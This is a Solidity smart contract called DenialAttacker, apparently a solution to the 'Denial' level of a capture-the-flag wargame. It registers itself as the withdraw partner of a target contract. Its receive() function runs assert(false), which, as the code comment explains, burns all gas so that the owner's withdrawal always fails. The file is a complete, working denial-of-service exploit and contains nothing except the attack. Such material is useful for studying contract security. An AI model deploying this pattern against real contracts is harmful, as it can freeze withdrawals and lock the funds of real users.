// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./20-Denial.sol";

contract DenialAttacker {
    Denial public denial;

    constructor(address payable _denialAddress) public {
        denial = Denial(_denialAddress);
    }

    function attack() public {
        denial.setWithdrawPartner(address(this));
    }

    receive() external payable {
        /*When owner call withdraw function
        from Denial contract, the call function 
        trigger this function and after assert 
        will consume all gas */
        assert(false);
    }
}
